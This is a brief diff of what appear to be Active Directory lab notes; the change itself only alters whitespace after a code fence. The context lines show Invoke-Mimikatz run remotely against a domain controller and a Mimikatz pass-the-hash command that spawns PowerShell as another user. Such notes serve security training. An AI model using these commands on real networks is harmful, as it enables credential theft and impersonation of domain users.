@@ -85,5 +85,5 @@ Invoke-command -Scriptblock ${function:Invoke-Mimikatz}  -computername xz-dc.abc
 
 3. Invoke-Mimikatz -command '"sekurlsa::pth /user:studentx /domain:abc.local /ntlm: <ntlm hash of user studentx> /run:powershell.exe"' : This method is known as OverPasstheHash attack . This will open a new powershell process as studentx user.
   
-```
+``` 
 ## Privilege Escalation
